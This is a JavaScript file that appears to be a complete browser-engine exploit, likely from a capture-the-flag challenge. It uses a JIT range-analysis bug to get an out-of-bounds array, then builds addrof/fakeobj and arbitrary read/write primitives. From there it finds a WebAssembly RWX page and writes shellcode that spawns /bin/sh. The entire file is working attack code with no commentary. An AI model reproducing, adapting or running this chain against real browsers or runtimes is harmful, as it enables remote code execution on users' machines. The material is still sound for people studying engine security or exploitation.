let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

var yee2;
function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
        if (i == -Infinity) {
            x = +Infinity;
        }
    }

    var value = Math.max(i, 0x100); // [0x100, inf]
    value = -value; // [-inf, -0x100]
    value = Math.max(value, -0x101);    // [-0x101, -0x100]
    value = -value; // [0x100, 0x101]
    value -= (0x100); // [0x2, 0x3]

    value >>= 1;
    value += 10;

    var array = Array(value);
    array[0] = 1.1;
    arr2 = [{}, 2.2, 2.2, 2.2, 2.2, 2.2];
    // yee2 = arr2;
    // var b = [2.2, 2.2, 2.2, 2.2, 2.2];
    yee2 = arr2;
    return [array, {}];
};

trigger();

for (let i = 0; i < 100000; ++i) {
    trigger();
}

yee = trigger()[0];
yoff = 0;

function addrof(o) {
    yee2[0] = o;
    yee2[1] = o;
    return yee[yoff].f2i() >> 32n;
}

function fakeobj(o) {
    o = o & 0xffffffffn;
    yee[yoff] = (o << 32n | o).i2f();
    return yee2[0];
}

function main() {

    for (let i = 10; i < 0x100; i-=-1) {
        if ((yee[i].f2i() & 0xffffffffn) == 0xcn) {
            yoff = i+1;
            break;
        }
        if ((yee[i].f2i() >> 32n) == 0xcn) {
            yoff = i+1;
            break;
        }
    }

    console.log("yoff", yoff);
    let a = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1];

    console.log("WASM start");
    var wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x85, 0x80, 0x80, 0x80, 0x0, 0x1, 0x60, 0x0, 0x1, 0x7f, 0x3, 0x82, 0x80, 0x80, 0x80, 0x0, 0x1, 0x0, 0x4, 0x84, 0x80, 0x80, 0x80, 0x0, 0x1, 0x70, 0x0, 0x0, 0x5, 0x83, 0x80, 0x80, 0x80, 0x0, 0x1, 0x0, 0x1, 0x6, 0x81, 0x80, 0x80, 0x80, 0x0, 0x0, 0x7, 0x91, 0x80, 0x80, 0x80, 0x0, 0x2, 0x6, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x2, 0x0, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x8a, 0x80, 0x80, 0x80, 0x0, 0x1, 0x84, 0x80, 0x80, 0x80, 0x0, 0x0, 0x41, 0x2a, 0xb]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;

    // found a
    offset = (addrof(a) - addrof(yee) - 0x10n) / 8n
    console.log("offset", offset);

    function read64(addr) {
        let r = (addr-0x8n) & 0xffffffffn;
        yee[offset] = (r << 32n | r).i2f();
        return  a[0].f2i();
    }

    function write64(addr, value) {
        let r = (addr-0x8n) & 0xffffffffn;
        yee[offset] = (r << 32n | r).i2f();
        a[0] = value.i2f();
        return true;
    }

    // leak rwx address
    let wasm_instance_addr = addrof(wasm_instance);
    console.log("wasm_instance_addr", wasm_instance_addr.toString(16));
    let rwx = read64(wasm_instance_addr+0x68n);
    console.log("rwx", rwx.toString(16));

    // write
    let arr = new ArrayBuffer(0x100);
    let arr_addr = addrof(arr);
    write64(arr_addr+0x14n, rwx);

    // alloc
    shellcode = [ 0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850, 0x1697268, 0x24348101, 0x1010101, 0x6a56f631, 0x1485e08, 0x894856e6, 0x6ad231e6, 0x50f583b];
    let z = new Uint32Array(arr);
    for (let i = 0; i < shellcode.length; i-=-1)
        z[i] = shellcode[i];

    let zz = new BigUint64Array(arr);
    for (let i = 0; i < 0x20; i-=-1)
        zz[0x80/8 + i] = rwx;

    // fail wasm exception
    f();
}

setTimeout(main, 500);
